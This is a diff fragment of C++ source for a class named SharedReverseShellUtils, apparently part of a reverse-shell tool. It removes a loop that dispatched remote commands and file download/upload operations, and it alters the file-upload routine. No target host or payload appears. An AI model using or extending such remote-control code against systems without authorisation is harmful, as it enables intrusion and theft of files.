@@ -15,29 +15,6 @@ class SharedReverseShellUtils
 public:
 	SharedReverseShellUtils(T * caller)
 		:m_caller(caller) {}
-	
-	void Start()
-	{
-		while (true)
-		{
-			switch (m_caller->ReadOperationType())
-			{
-			case RunCommand:
-				m_caller->Command();
-				break;
-			case DownloadFile:
-				m_caller->Download();
-				break;
-			case UploadFile:
-				m_caller->Upload();
-				break;
-			default:
-				m_caller->InvalidOperation();
-				break;
-			}
-
-		}
-	}
 
 	void Send(const std::string& message)
 	{
@@ -53,9 +30,9 @@ public:
 			throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)
 	}
 
-	void Upload(int fileSize)
+	void Upload(int fileSize, const std::string& messsageToSend)
 	{
-		Send(std::to_string(fileSize));
+		Send(messsageToSend);
 
 		while (fileSize > 0)
 		{
@@ -87,8 +64,6 @@ public:
 			fileSize -= responseSize;
 			std::cout << "Remaining bytes: " << fileSize << "    Response Size: " << responseSize << std::endl;
 		}
-		
-		std::cout << "Finished Downloading " << filePath << std::endl;
 		m_caller->m_file.close();
 	}
 
